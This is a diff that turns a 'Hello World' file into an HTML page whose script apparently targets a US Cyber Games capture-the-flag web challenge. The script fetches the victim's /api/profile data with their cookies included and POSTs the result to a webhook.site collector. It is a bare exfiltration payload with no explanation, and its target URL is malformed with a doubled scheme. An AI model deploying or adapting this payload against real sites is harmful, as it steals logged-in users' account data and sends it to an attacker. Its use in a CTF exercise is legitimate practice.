@@ -1,1 +1,15 @@
-Hello World
+<!DOCTYPE html>
+<html>
+    <body>
+        <script>
+        fetch('https://https://jxjrmrde.web.ctf.uscybergames.com//api/profile', {credentials: 'include'})
+        .then(r => r.json())
+        .then(data => {
+            fetch('https://webhook.site/9da31c49-69a5-4970-b511-06945289d357', {
+                method: 'POST',
+                body: JSON.stringify(data)
+            });
+        });
+        </script>
+    </body>
+</html>
